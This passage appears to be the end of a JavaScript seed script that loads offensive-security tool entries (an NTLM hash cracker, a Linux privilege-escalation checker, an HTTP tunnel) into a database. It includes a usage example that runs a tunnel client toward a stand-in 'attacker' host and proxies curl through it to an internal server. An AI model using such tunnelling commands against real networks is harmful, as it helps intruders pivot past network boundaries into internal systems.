./tunnel -mode client -addr http://attacker:8080 -socks :1080

# Use the tunnel
curl --socks5 127.0.0.1:1080 http://internal-server/
\`\`\`
`, 0, now);

console.log('Seeded: Password Cracking & PrivEsc Tools');
console.log('  - NTLM Hash Cracker');
console.log('  - Linux PrivEsc Checker');
console.log('  - HTTP Tunnel');
